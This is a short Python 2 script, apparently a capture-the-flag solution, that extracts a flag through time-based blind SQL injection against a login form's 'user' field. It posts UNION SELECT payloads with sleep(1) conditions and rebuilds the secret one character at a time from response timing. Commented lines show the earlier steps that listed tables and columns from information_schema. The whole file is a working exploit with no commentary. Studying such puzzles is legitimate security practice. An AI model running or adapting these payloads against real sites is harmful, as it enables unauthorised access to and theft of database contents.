import httplib, urllib, time

choice = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
passwd = 'FLAG{'
count = 0
while True:
    flag = 0
    for i in choice:
        if i == 't' and count == 0: continue #INNODB
        conn = httplib.HTTPConnection("ctf.tw", 6003)
        header = {"Content-Type": "application/x-www-form-urlencoded;charset=utf-8"}
#params = urllib.urlencode({"user":"admin' -- ", "password": ""})
        #params = urllib.urlencode({"user":"admin' AND if(user LIKE BINARY \"" + passwd + i + '%", sleep(1), 1) -- ', "password": ""})
        #params = urllib.urlencode({"user":"admin' UNION ALL SELECT 1,table_name from information_schema.tables where if(table_name LIKE BINARY \"" + passwd + i + '%", sleep(1), 1) -- ', "password": ""})
        #params = urllib.urlencode({"user":"admin' UNION ALL SELECT 1,column_name from information_schema.columns where table_name='top_secret' AND if(column_name LIKE BINARY \"" + passwd + i + '%", sleep(1), 1) -- ', "password": ""})
        params = urllib.urlencode({"user":"admin' UNION ALL SELECT 1,value from top_secret where if(value LIKE BINARY \"" + passwd + i + '%", sleep(1), 1) limit 2, 1-- ', "password": ""})
        params = params.encode('utf-8')
        #print params
        conn.request("POST", "/admin.php", params, headers=header)
        ptime = time.time()
        response = conn.getresponse()
        print response.status, response.reason
        response.read()
        ptime = time.time()-ptime
        if ptime > 1:
            flag = 1
            passwd += str(i)
            break
    count += 1
    if flag == 0: break
print passwd

